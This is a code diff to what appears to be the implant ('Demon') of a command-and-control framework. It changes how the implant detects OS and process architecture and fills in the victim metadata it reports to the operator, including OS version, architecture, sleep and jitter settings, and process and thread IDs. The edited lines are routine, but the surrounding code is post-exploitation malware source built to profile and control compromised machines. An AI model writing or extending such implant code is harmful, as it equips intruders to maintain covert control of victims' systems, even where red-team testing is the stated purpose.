@@ -245,9 +245,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PackageAddInt32( *MetaData, OsVersions.wProductType );
     PackageAddInt32( *MetaData, OsVersions.wServicePackMajor );
     PackageAddInt32( *MetaData, OsVersions.dwBuildNumber );
-
     PackageAddInt32( *MetaData, Instance.Session.OS_Arch );
-
 
     PackageAddInt32( *MetaData, Instance.Config.Sleeping );
     PackageAddInt32( *MetaData, Instance.Config.Jitter );
@@ -258,7 +256,6 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 {
     OSVERSIONINFOEXW             OSVersionExW     = { 0 };
-    SYSTEM_PROCESSOR_INFORMATION SystemInfo       = { 0 };
     PVOID                        RtModules[]      = {
             RtAdvapi32,
             RtMscoree,
@@ -361,6 +358,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 
     /* resolve Windows version */
     Instance.Session.OSVersion = WIN_VERSION_UNKNOWN;
+    OSVersionExW.dwOSVersionInfoSize = sizeof( OSVersionExW );
     if ( NT_SUCCESS( Instance.Win32.RtlGetVersion( &OSVersionExW ) ) ) {
         if ( OSVersionExW.dwMajorVersion >= 5 ) {
             if ( OSVersionExW.dwMajorVersion == 5 ) {
@@ -475,11 +473,6 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
     }
 
-    /* query current processor architecture */
-    if ( ! NT_SUCCESS( SysNtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) ) {
-        PUTS( "[!] NtQuerySystemInformation Failed" );
-    }
-
     if ( KArgs )
     {
 #if SHELLCODE
@@ -503,8 +496,19 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
     }
 
-    // TODO: this value changes depending on the process arch
-    Instance.Session.OS_Arch   = SystemInfo.ProcessorArchitecture;
+#if _WIN64
+    Instance.Session.OS_Arch      = PROCESSOR_ARCHITECTURE_AMD64;
+    Instance.Session.Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
+#else
+    Instance.Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
+    Instance.Session.OS_Arch      = PROCESSOR_ARCHITECTURE_UNKNOWN;
+    if ( ProcessIsWow( NtCurrentProcess() ) ) {
+        Instance.Session.OS_Arch  = PROCESSOR_ARCHITECTURE_AMD64;
+    } else {
+        Instance.Session.OS_Arch  = PROCESSOR_ARCHITECTURE_INTEL;
+    }
+#endif
+
     Instance.Session.PID       = U_PTR( Instance.Teb->ClientId.UniqueProcess );
     Instance.Session.TID       = U_PTR( Instance.Teb->ClientId.UniqueThread );
     Instance.Session.Connected = FALSE;
